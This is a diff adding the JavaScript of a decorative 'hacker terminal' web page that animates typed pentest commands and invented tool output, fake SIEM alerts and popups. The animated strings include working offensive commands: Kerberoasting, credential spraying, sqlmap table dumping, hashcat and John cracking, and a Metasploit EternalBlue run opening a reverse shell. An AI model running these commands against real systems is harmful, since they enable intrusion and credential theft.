+      `$krb5tgs$23$*svc_enum$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$a8f3c2e1d9b7a6f5c4e8d7a2b9c1e3f6...`,
+      '[+] Hash exported to hashes.txt','[*] Crack with: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt'
+    ],sev:'ok',popup:{t:'[SPN] HASH CAPTURED',d:'Kerberoastable account found',meta:'svc_enum@corp.local'}},
+    
+    {cmd:"crackmapexec smb 10.12.0.0/24 -u svc_backup -p 'P@ss2024!' --shares",lines:[
+      'SMB  10.12.0.14  445  DC01  [*] Windows Server 2022 Build 20348 (name:DC01)',
+      'SMB  10.12.0.14  445  DC01  [+] corp.local\\svc_backup:P@ss2024!',
+      'SMB  10.12.0.14  445  DC01  [+] Enumerated shares: ADMIN$, C$, IPC$, NETLOGON, SYSVOL',
+      'SMB  10.12.0.14  445  DC01  [+] ADMIN$ - Read:False Write:True',
+      'SMB  10.12.0.14  445  DC01  [+] C$ - Read:True Write:True',
+      '[*] Writable share C$ found - candidate for payload upload'
+    ],sev:'warn',popup:{t:'[CME] CREDENTIAL VALID',d:'Writable share C$ on DC01',meta:'svc_backup@corp.local'}},
+    
+    {cmd:"sqlmap -u 'https://api.target.io/search' -p q --risk=3 --level=5 --batch --threads=4",lines:[
+      'sqlmap/1.8.3#stable (https://sqlmap.org)','[*] starting @ '+ts()+' /'+ts()+'/',
+      '[*] testing connection to target URL','[*] testing if parameter q is dynamic',
+      '[*] testing AND boolean-based blind','[*] testing Generic UNION query (NULL)',
+      '[*] confirming UNION injectability with 7 columns','[*] target URL appears to be injectable',
+      'back-end DBMS: PostgreSQL >= 12.0','[*] fetching database names',
+      "[*] retrieved: 'public', 'analytics', 'users_db'","[*] fetching tables for database 'users_db'",
+      "[*] retrieved: users, sessions, transactions, audit_log","[*] dumping table 'users_db.users' (partial)",
+      '[*] retrieved 147 entries','[*] data saved to ~/.local/share/sqlmap/output/api.target.io'
+    ],sev:'warn',popup:{t:'[SQLMAP] INJECTION CONFIRMED',d:'147 user records extracted',meta:'PostgreSQL >= 12.0'}},
+    
+    {cmd:"hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O --force --status",lines:[
+      'hashcat (v6.2.7) starting in optimized mode',
+      'OpenCL API (OpenCL 3.0 CUDA 12.5.82) - Platform #1 [NVIDIA Corporation]',
+      '* Device #1: NVIDIA GeForce RTX 4070 Ti, 11776/12288 MB, 48MCU',
+      'Hashes: 5 digests; 5 unique digests, 5 unique salts',
+      'Rules: 1 applied from /usr/share/hashcat/rules/best64.rule',
+      'Optimizers: Max length 31, Min length 8','Attack Mode: Dictionary + Rules',
+      `Session: pentest_${ts().replace(/:/g,'')}`,
+      'Status: Running | Speed: 41.2 GH/s | ETA: 00:03:48',
+      'Recovered: 3/5 (60.00%) Digests, 3/5 (60.00%) Salts',
+      'Candidates: summer2024! -> WinterP@ss2025',
+      '[+] Cracked: svc_admin:$NT$e9a7f2c1b8d4a6e3f5c2d9b1a7e4f8c2:Welcome123!',
+      '[+] Cracked: backup_svc:$NT$a3f8c2e1d9b7a6f5c4e8d7a2b9c1e3f6:Backup$2024',
+      'Session stopped - 3 passwords recovered'
+    ],sev:'ok',popup:{t:'[HASHCAT] 3/5 CRACKED',d:'NTLM hashes recovered',meta:'Review ~/.john/john.pot'}},
+    
+    {cmd:"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.12.0.14; set LHOST 10.12.0.50; run'",lines:[
+      'msf6 > use exploit/windows/smb/ms17_010_eternalblue',
+      'msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.12.0.14',
+      'RHOSTS => 10.12.0.14',
+      'msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.12.0.50',
+      'LHOST => 10.12.0.50',
+      'msf6 exploit(windows/smb/ms17_010_eternalblue) > run',
+      '[*] Started reverse TCP handler on 10.12.0.50:4444',
+      '[*] 10.12.0.14:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check',
+      '[+] 10.12.0.14:445 - Host is likely VULNERABLE to MS17-010!',
+      '[*] 10.12.0.14:445 - Connecting to target for exploitation.',
+      '[*] 10.12.0.14:445 - Connection established for exploitation.',
+      '[*] 10.12.0.14:445 - Target OS selected valid for OS indicated by SMB reply',
+      '[*] Sending stage (200776 bytes) to 10.12.0.14',
+      '[*] Meterpreter session 1 opened (10.12.0.50:4444 -> 10.12.0.14:49821)',
+      'meterpreter > getuid','Server username: NT AUTHORITY\\SYSTEM',
+      'meterpreter > sysinfo','Computer: DC01.corp.local',
+      'OS: Windows Server 2022 Standard (Build 20348)','Architecture: x64',
+      '[*] Session 1 opened - consider: hashdump, mimikatz, lateral movement'
+    ],sev:'crit',popup:{t:'[MSF] SESSION ESTABLISHED',d:'NT AUTHORITY\\SYSTEM on DC01',meta:'Session ID: 1'}},
+    
+    {cmd:"bloodhound-python -c All -d corp.local -dc dc01 --zip -ns 10.12.0.10",lines:[
+      'INFO: BloodHound CE Collector v1.2.1',
+      'INFO: Connecting to LDAP server: dc01.corp.local:389',
+      'INFO: Authentication successful for user svc_enum@corp.local',
+      'INFO: Found 1 Domain: CORP.LOCAL','INFO: Found 2 Domain Controllers: DC01, DC02',
+      'INFO: Enumerating users... 2,847 accounts','INFO: Enumerating groups... 428 groups',
+      'INFO: Enumerating computers... 156 endpoints','INFO: Enumerating GPOs... 34 policies',
+      'INFO: Building attack paths... 1,204 edges mapped',
+      'INFO: Shortest path to DA: svc_backup → AdminSDHolder → Domain Admins',
+      `INFO: Output written to bloodhound_${ts().replace(/:/g,'')}.zip`,
+      'INFO: Upload to BloodHound CE for visualization'
+    ],sev:'ok',popup:{t:'[BH] ATTACK PATH MAPPED',d:'svc_backup → AdminSDHolder → DA',meta:'1,204 edges'}},
+    
+    {cmd:"python3 kerbrute.py -d corp.local -u users.txt -p passwords.txt --dc 10.12.0.10",lines:[
+      '[*] Kerbrute v1.2 starting','[*] Target DC: dc01.corp.local (10.12.0.10)',
+      '[*] Testing 247 credentials...','[+] VALID: svc_backup:P@ss2024!',
+      '[+] VALID: dev_admin:DevAccess2024','[+] VALID: backup_svc:Backup$2024',
+      '[*] 3/247 valid credentials | Exported to valid_creds.txt',
+      '[*] Next: impacket-secretsdump or crackmapexec with valid creds'
+    ],sev:'warn',popup:{t:'[KERBRUTE] 3 VALID CREDS',d:'Exported to valid_creds.txt',meta:'corp.local'}},
+    
+    {cmd:"proxychains -q python3 ldap_search.py -H ldap://10.12.0.10 -b 'DC=corp,DC=local' '(objectClass=person)'",lines:[
+      'ProxyChains-4.16 | config: /etc/proxychains.conf',
+      '|DNS-request| dc01.corp.local','|S-chain|-<>-127.0.0.1:9050-<><>-10.12.0.10:389-<><>-OK',
+      '[*] LDAP bind successful (svc_enum)','[*] Base DN: DC=corp,DC=local',
+      '[*] Filter: (objectClass=person)','[*] Retrieved 2,847 user objects',
+      '[*] Attributes: sAMAccountName, mail, memberOf, lastLogon',
+      '[*] High-value targets: 12 members of "Domain Admins"',
+      '[*] Exported to ldap_dump_'+ts().replace(/:/g,'')+'.json'
+    ],sev:'ok',popup:{t:'[LDAP] 2,847 USERS DUMPED',d:'12 Domain Admins identified',meta:'Exported to JSON'}},
+    
+    {cmd:"john --format=nt hashes_nt.txt --wordlist=/usr/share/wordlists/rockyou.txt --session=pentest",lines:[
+      'Created directory: ~/.john','Loaded 8 NTLM hashes (8 salts)',
+      'Will run 12 OpenMP threads','Press Ctrl-C to abort, almost any other key for status',
+      'Welcome123!      (svc_admin)','Backup$2024      (backup_svc)',
+      'DevAccess2024  (dev_admin)','3g 0:00:00:03 100% 1.2g/s 14.2Kp/s 14.2Kc/s 14.2KC/s',
+      'Session completed. 3 passwords cracked. See ~/.john/john.pot'
+    ],sev:'ok',popup:{t:'[JOHN] 3 PASSWORDS CRACKED',d:'NTLM hashes recovered',meta:'~/.john/john.pot'}}
+  ];
+
+  // === THREAT ALERTS (SOC/SIEM style) ===
+  const alerts=[
+    `[${ts()}] suricata[2241]: [1:2024218:1] ET SCAN Nmap SYN Scan {TCP} 10.12.0.50:53214→10.12.0.10:445`,
+    `[${ts()}] wazuh[1882]: Rule 5712 - Auth failure (4625) src:10.12.0.14 user:Administrator x17`,
+    `[${ts()}] suricata[2241]: [1:2009588:3] ET TROJAN C2 Beacon {TCP} 10.12.0.18:49152→198.51.100.22:443`,
+    `[${ts()}] defender[ATP]: Suspicious PS exec - encoded cmd, AMSI bypass attempt`,
+    `[${ts()}] crowdstrike[EDR]: Process injection: svchost.exe→mimikatz.dll (PID:1842)`,
+    `[${ts()}] splunk[SIEM]: TR-2025-041: Lateral movement SMB+WMI+PsExec detected`,
+    `[${ts()}] zeek[IDS]: DNS tunneling: high-entropy queries to *.tk`,
+    `[${ts()}] elastic[SIEM]: Anomaly>0.92 - svc_backup accessing \\\\DC01\\\\confidential`
+  ];
+
+  // === POPUP NOTIFICATIONS ===
+  const popups=[
+    {t:'[NMAP] SCAN COMPLETE',d:'18 hosts up, 11 services mapped',meta:'Target: 10.12.0.10/24',sev:'ok'},
+    {t:'[SPN] HASH CAPTURED',d:'Kerberoastable account found',meta:'svc_enum@corp.local',sev:'ok'},
+    {t:'[CME] CREDENTIAL VALID',d:'Writable share C$ on DC01',meta:'svc_backup@corp.local',sev:'warn'},
+    {t:'[SQLMAP] INJECTION CONFIRMED',d:'147 user records extracted',meta:'PostgreSQL >= 12.0',sev:'warn'},
+    {t:'[HASHCAT] 3/5 CRACKED',d:'NTLM hashes recovered',meta:'Review ~/.john/john.pot',sev:'ok'},
+    {t:'[MSF] SESSION ESTABLISHED',d:'NT AUTHORITY\\SYSTEM on DC01',meta:'Session ID: 1',sev:'crit'},
+    {t:'[BH] ATTACK PATH MAPPED',d:'svc_backup → AdminSDHolder → DA',meta:'1,204 edges',sev:'ok'},
+    {t:'[KERBRUTE] 3 VALID CREDS',d:'Exported to valid_creds.txt',meta:'corp.local',sev:'warn'},
+    {t:'[LDAP] 2,847 USERS DUMPED',d:'12 Domain Admins identified',meta:'Exported to JSON',sev:'ok'},
+    {t:'[JOHN] 3 PASSWORDS CRACKED',d:'NTLM hashes recovered',meta:'~/.john/john.pot',sev:'ok'},
+    {t:'🔴 CRITICAL',d:'Ransomware pattern on 2 endpoints',meta:'Isolate immediately',sev:'crit'},
+    {t:'⚠ ALERT',d:'C2 callback to 198.51.100.22:443',meta:'Blocked by firewall',sev:'crit'},
+    {t:'🎯 APT DETECTED',d:'TTPs match APT29: T1059.001, T1071.001',meta:'Escalate to Tier-3',sev:'crit'}
+  ];
+
+  // === TYPE SIMULATION: realistic keystroke rhythm ===
+  async function type(text){
+    cmdBuf.textContent='';
+    const base=turbo?7:26;
+    for(let i=0;i<text.length;i++){
+      // 4.5% typo + correction
+      if(Math.random()<0.045 && i>4 && i<text.length-2){
+        cmdBuf.textContent+=text[i]+text[i+1];
+        await delay(base*0.75);
+        cmdBuf.textContent=cmdBuf.textContent.slice(0,-1);
+        await delay(base*1.4);
+        continue;
+      }
+      cmdBuf.textContent+=text[i];
+      await delay(base+rnd(-9,13));
+      // Occasional pause mid-command
+      if(i>0 && i%rnd(14,32)===0 && Math.random()<0.18)await delay(rnd(90,220));
+    }
+    await delay(rnd(160,380)/(turbo?2:1));
+  }
+
+  // === STREAM OUTPUT: line-by-line with contextual coloring ===
+  async function stream(lines,sev){
+    for(const ln of lines){
+      const el=document.createElement('div');
+      el.className=`line ${sev}`;
+      out.appendChild(el);
+      const spd=turbo?4:13;
+      for(const c of ln){
+        el.textContent+=c;
+        await delay(spd+rnd(-5,9));
+      }
+      el.classList.add('show');
+      await delay(rnd(16,48)/(turbo?2:1));
+      out.scrollTop=out.scrollHeight;
+      if(out.children.length>18)out.removeChild(out.firstChild);
+    }
+  }
+
+  // === ALERT TICKER ===
+  function tickAlert(msg,sev='info'){
+    ticker.textContent=msg.length>78?msg.substring(0,75)+'...':msg;
+    ticker.className=`alert-ticker ${sev==='crit'?'crit':sev==='warn'?'high':''}`;
+  }
+
+  // === POPUP NOTIFICATION ===
+  function popup(title,desc,sev='ok',meta=''){
+    const el=document.createElement('div');
+    el.className=`popup ${sev==='warn'?'warn':sev==='crit'?'crit':''}`;
+    el.innerHTML=`<span class="p-title">${title}</span><span class="p-desc">${desc}</span>${meta?`<span class="p-meta">${meta}</span>`:''}`;
+    popupLayer.appendChild(el);
+    requestAnimationFrame(()=>el.classList.add('show'));
+    setTimeout(()=>{
+      el.classList.remove('show');
+      setTimeout(()=>el.remove(),200);
+    },3200);
+  }
+
+  // === THREAT LEVEL ===
+  function setThreat(lvl){
+    threatLvl=lvl;
+    const map={low:{t:'LOW',c:'var(--green)'},med:{t:'MED',c:'var(--ok)'},high:{t:'HIGH',c:'var(--warn)'},crit:{t:'CRIT',c:'var(--alert)'}};
+    const cfg=map[lvl]||map.low;
+    threat.textContent=cfg.t;threat.style.color=cfg.c;
+    core.classList.remove('threat-high','threat-crit');
+    if(lvl==='high')core.classList.add('threat-high');
+    if(lvl==='crit')core.classList.add('threat-crit');
+    // Wolf dot color
+    wolfDot.style.background=cfg.c;
+  }
+
+  // === MAIN LOOP ===
+  async function run(){
+    if(!running||busy)return;busy=true;
+    
+    // Metrics fluctuation
+    pid.textContent=rnd(1000,9999);
+    mem.textContent=`${rnd(110,280)}MB`;
+    cpu.textContent=`${rnd(4,62)}%`;
+    
+    // Threat drift
+    if(Math.random()<0.19){
+      const lvls=['low','low','low','med','med','high'];
+      const nl=pick(lvls);
+      if(nl!==threatLvl)setThreat(nl);
+      if(threatLvl==='high'||threatLvl==='crit'){
+        tickAlert(pick(alerts),threatLvl==='crit'?'crit':'warn');
+        sess++;
+      }else{
+        tickAlert(pick(alerts).substring(0,70)+'...', 'info');
+      }
+    }
+    
+    // Execute op
+    const op=pick(ops);
+    await type(op.cmd);
+    cmdBuf.textContent='';
+    await stream(op.lines,op.sev);
+    
+    // Show popup for this op
+    if(op.popup && Math.random()<0.85){
+      popup(op.popup.t,op.popup.d,op.popup.sev,op.popup.meta);
+    }
+    
+    // Random critical event popup
+    if(Math.random()<0.23){
+      const crit=pick(popups.filter(p=>p.sev==='crit'));
+      popup(crit.t,crit.d,'crit',crit.meta);
+      setThreat('crit');
+      tickAlert(crit.d.substring(0,65)+'...', 'crit');
+      // Auto-recover
+      setTimeout(()=>{if(threatLvl!=='low')setThreat('med')},rnd(3400,6200));
+    }
+    
+    // Random info popup
+    if(Math.random()<0.35 && threatLvl!=='crit'){
+      const info=pick(popups.filter(p=>p.sev!=='crit'));
+      popup(info.t,info.d,info.sev,info.meta);
+    }
+    
+    busy=false;
+    await delay(rnd(380,1050)/(turbo?2:1));
+    run();
+  }
+
+  // === QUICK COMMANDS ===
+  document.querySelectorAll('.cmd-palette button').forEach(btn=>{
+    btn.onclick=e=>{
+      e.stopPropagation();
+      const cmd=btn.dataset.cmd;
+      const quick={
+        scan:{c:"nmap -sS -T4 -p 22,80,443,445,3389 10.12.0.0/24",s:'ok',p:{t:'[QUICK] SCAN',d:'5 ports on /24',meta:'Running...'}},
+        exploit:{c:"searchsploit 'windows server 2022' | grep -i 'privilege'",s:'warn',p:{t:'[QUICK] EXPLOIT',d:'Searching Exploit-DB',meta:'Filtering...'}},
+        enum:{c:"ldapsearch -x -H ldap://10.12.0.10 -b 'DC=corp,DC=local' '(objectClass=*)'",s:'ok',p:{t:'[QUICK] ENUM',d:'LDAP query launched',meta:'DC: 10.12.0.10'}},
+        exfil:{c:"python3 exfil_test.py --target dc01 --method dns --size 50MB",s:'warn',p:{t:'[QUICK] EXFIL TEST',d:'Simulated DNS exfil',meta:'50MB payload'}},
+        stealth:{c:"iptables -A OUTPUT -p tcp --dport 443 -j LOG --log-prefix 'OP: '",s:'ok',p:{t:'[QUICK] STEALTH',d:'Traffic logging enabled',meta:'iptables rule added'}}
+      };
+      const q=quick[cmd];
+      if(q){
+        type(q.c);
+        setTimeout(()=>{cmdBuf.textContent='';stream([`[*] ${q.c.substring(0,52)}...`],q.s);if(q.p)popup(q.p.t,q.p.d,q.p.sev,q.p.meta);},380);
+        turbo=true;setTimeout(()=>turbo=false,600);
+      }
+    };
+  });
+
+  // === WOLF CORNER INTERACTION ===
+  wolf.onclick=e=>{
+    e.stopPropagation();
+    if(turbo)return;
+    turbo=true;
+    setThreat('high');
+    wolfDot.style.background='var(--warn)';
+    popup('🎯 FOCUS MODE','Accelerated ops + aggressive enumeration','warn','~2.1s duration');
+    type('[!] MANUAL OVERRIDE - Priority targeting active');
+    setTimeout(()=>{
+      turbo=false;
+      setThreat('med');
+      wolfDot.style.background='var(--green)';
+      type('[~] Reverting to standard profile');
+      popup('✓ PROFILE RESTORED','Standard monitoring resumed','ok');
+    },2100);
+  };
+
+  // === INIT ===
+  setTimeout(()=>{
+    core.classList.add('visible');
+    setThreat('low');
+    tickAlert('[INIT] Terminal ops ready. Waiting for input...', 'info');
+    popup('[SYSTEM] Ops Console Online','Pentest modules loaded','ok',fmtTS());
+    run();
+  },100);
+
+  window.addEventListener('beforeunload',()=>running=false);
+})();
+</script>
+  
+  </body>
+</html>
